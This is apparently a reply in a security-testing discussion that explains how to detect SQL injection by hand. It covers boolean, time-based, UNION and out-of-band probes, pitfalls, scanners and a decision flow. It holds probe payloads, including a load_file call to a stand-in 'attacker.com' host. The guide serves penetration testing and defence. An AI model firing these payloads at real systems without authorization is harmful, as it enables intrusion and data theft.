## 1. Manual Testing Steps (Expanded)

Your list of payloads is correct. Here’s how to apply them systematically:

### A. The Single Quote (`'`) – First Alert
- **Where:** Every input field, URL parameter, POST body, cookie, or HTTP header.
- **Why:** If the app doesn’t sanitize the quote, it breaks the SQL query syntax, often causing a database error (e.g., *“Unclosed quotation mark”*, *“You have an error in your SQL syntax”*).
- **Limitation:** Some apps suppress errors or handle them gracefully. A missing error doesn’t mean no vulnerability.

### B. Boolean Blind Testing
- **Test 1:** `...parameter=1 AND 1=1`
- **Test 2:** `...parameter=1 AND 1=2`
- **What to watch for:**  
  - If the page behaves differently (e.g., shows “Welcome back” vs. “No results”), you likely have a boolean blind injection.
  - Compare both responses side‑by‑side (response length, status code, visible text).

### C. Time‑Based Blind Testing
- **Payload example (MySQL):** `1 AND SLEEP(5)`
- **Payload example (PostgreSQL):** `1 OR pg_sleep(5)`
- **What to watch for:** Measure the actual response time. A 5+ second delay strongly indicates injection.
- **Tip:** Test a benign payload first (e.g., `1 AND 1=1`) to measure baseline response time.

### D. Union‑Based Testing
- **Goal:** Retrieve data from other tables.
- **Test:** `' UNION SELECT NULL, NULL, ... --` (adjust number of NULLs to match original query columns).
- **Look for:** Unexpected data appearing on the page (e.g., usernames, database version strings).

### E. Out‑of‑Band (OAST) Testing
- **Payload example:** `1 AND load_file('\\\\attacker.com\\x')` (MySQL, Windows)
- **Best for:** Blind injection where time‑based delays are unreliable (e.g., asynchronous queries, heavy logging).
- **Requires:** A server you control (or Burp Collaborator) to catch DNS/HTTP interactions.

## 2. Common Pitfalls in Manual Detection

| Pitfall | Why it misleads | What to do instead |
|--------|----------------|---------------------|
| Relying only on `'` | App may sanitize quotes but still be vulnerable to numeric or blind injection | Always test boolean/time‑based payloads even if `'` gives no error |
| Ignoring other SQL syntax | `;`, `--`, `/* */`, `%00` may trigger different behaviors | Include comment and delimiter characters in your initial probes |
| Not testing HTTP headers | `User-Agent`, `Referer`, `X-Forwarded-For` often go unsanitized | Burp’s “Param Miner” extension helps discover these |
| Treating “no error” as safe | Many apps customise error pages; injection could still work | Use boolean/time‑based checks on every endpoint |

## 3. Automated Tools (Your Burp Scanner mention)

You’re right – Burp Scanner (Professional) detects the majority quickly. Alternatives:

- **sqlmap** – Open‑source, very thorough, but noisy (not for production without care).
- **Netsparker** – Good at blind detection.
- **Acunetix** – Covers many edge cases.

## 4. Quick Decision Flow for Manual Testing

```text
For each input parameter:
1. Submit single quote   → Any error?  
   Yes → Likely injectable (test UNION/time/boolean)
   No  → Go to step 2

2. Submit AND 1=1 vs AND 1=2  → Different responses?  
   Yes → Boolean blind injection  
   No  → Go to step 3

3. Submit SLEEP(5) payload    → Response delay > 4 sec?  
   Yes → Time‑based blind injection  
   No  → Mark as probably safe (but re‑test if app changes)
```

## Final Note

The most critical skill in manual detection is **observing differences** – not just errors. Many SQL injections today are blind and reveal nothing except subtle changes in response time, content length, or status code. Use a proxy (Burp Suite Community Edition is free) to compare raw responses.
